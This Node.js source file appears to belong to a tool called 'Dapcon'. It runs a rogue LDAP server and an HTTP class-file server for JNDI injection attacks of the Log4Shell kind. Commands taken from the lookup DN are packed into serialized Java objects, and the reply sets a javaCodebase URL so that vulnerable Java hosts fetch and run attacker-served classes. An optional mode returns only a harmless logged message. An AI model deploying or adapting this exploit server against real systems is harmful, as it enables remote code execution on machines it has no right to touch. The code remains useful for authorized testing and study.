const getConfig = require("./utils/config.js");
const { createMessageBuffer, createObjectBuffer } = require("./utils/buffers.js");
const { http: logHttp, ldap: logLdap } = require("./utils/debug.js");

const path = require("path");

const ldap = require("ldapjs");
const express = require("express");

/**
 * Sends a message through an LDAP server.
 * @param {unknown} req The LDAP server request.
 * @param {unknown} res The LDAP server response.
 * @param {string} payload The message to send.
 */
function sendMessage(req, res, payload) {
	logLdap("sending message '%s' to log", payload);

	const buffer = createMessageBuffer(payload);

	res.send({
		attributes: {
			javaClassName: "java.lang.String",
			javaSerializedData: buffer,
		},
		dn: req.dn.toString(),
	});
}

/**
 * Sends an object through an LDAP server.
 * @param {import("./utils/config.js").DapconConfig} config The configuration.
 * @param {unknown} req The LDAP server request.
 * @param {unknown} res The LDAP server response.
 * @param {string} command The command to send in the object.
 */
function sendObject(config, req, res, command) {
	logLdap("sending object with command '%s' to be executed from log", command);

	const buffer = createObjectBuffer(command, config.className);

	res.send({
		attributes: {
			javaClassName: config.className,
			javaCodebase: "http://" + config.host + ":" + config.httpPort + "/codebase/",
			javaSerializedData: buffer,
		},
		dn: req.dn.toString(),
	});
}

/**
 * Handles an LDAP server search request.
 * @param {import("./utils/config.js").DapconConfig} config The configuration.
 * @param {unknown} req The LDAP server request.
 * @param {unknown} res The LDAP server response.
 */
function handleLdapSearch(config, req, res) {
	try {
		const match = req.dn.toString().match(/cmd=(.+)/);
		if (match !== null) {
			const command = match[1];
			logLdap("handling LDAP request for command '%s'", command);

			if (config.sendMessage) {
				const message = "<user wants to execute command " + command + ">";
				sendMessage(req, res, message);
			} else {
				sendObject(config, req, res, command);
			}
		}
	} catch (error) {
		logLdap("failed to handle LDAP search: %O", error);
	} finally {
		res.end();
	}
}

/**
 * Serves a class file at `/codebase/$className.class`.
 * @param {import("express").Express} app The Express app.
 * @param {string} className The name of the class to serve.
 */
function serveClassFile(app, className) {
	logHttp("now serving class file for %s", className);

	const classNamePath = className.replace("$", "\\$");
	app.use("/codebase/" + classNamePath + ".class", express.static(path.resolve(__dirname, "/.."), {
		index: className + ".class",
	}));
}

/**
 * Starts the LDAP and HTTP servers.
 */
async function start() {
	const config = await getConfig();

	const ldapServer = ldap.createServer();
	const app = express();

	ldapServer.search("", (req, res) => handleLdapSearch(config, req, res));

	ldapServer.listen(config.ldapPort, () => {
		logLdap("LDAP server listening on ldap://0.0.0.0:%d", config.ldapPort);
	});

	app.use((req, _, next) => {
		logHttp("%s %s: HTTP request from '%s'", req.method, req.path, req.headers["user-agent"]);
		next();
	});

	serveClassFile(app, config.className);

	app.listen(config.httpPort, () => {
		logHttp("HTTP server listening on http://0.0.0.0:%d", config.httpPort);
	});
}

/* eslint-disable-next-line unicorn/prefer-top-level-await */
start();
